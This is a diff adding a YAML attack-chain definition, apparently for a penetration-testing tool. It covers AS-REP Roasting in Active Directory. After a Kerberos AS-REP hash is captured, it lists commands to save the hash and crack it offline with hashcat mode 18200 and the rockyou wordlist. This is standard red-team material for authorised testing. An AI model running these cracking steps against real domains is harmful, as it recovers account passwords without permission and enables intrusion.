@@ -1,0 +1,29 @@
+chain_id: kerberos_asrep_roast
+title: "AS-REP Roasting — crack krb5asrep$23 hashes (hashcat -m 18200)"
+severity: CRITICAL
+tags: [crypto, kerberos, ad, asrep-roasting, hashcat]
+
+trigger:
+  any_of:
+    - { kind: kerberos-asrep }
+
+description: |
+  AS-REP Roastable hash captured ($krb5asrep$23$user@DOMAIN:...). Means the
+  account has 'Do not require Kerberos preauthentication' set — anyone can
+  request a TGT for it and crack the encrypted blob offline.
+
+steps:
+  - id: 1
+    title: "Save the hash"
+    command: echo '$krb5asrep$23$user@DOMAIN:abcdef...$0123...' > asrep.hash
+
+  - id: 2
+    title: "Crack with hashcat"
+    command: hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "Show the result"
+    command: hashcat -m 18200 asrep.hash --show
+
+references:
+  - https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
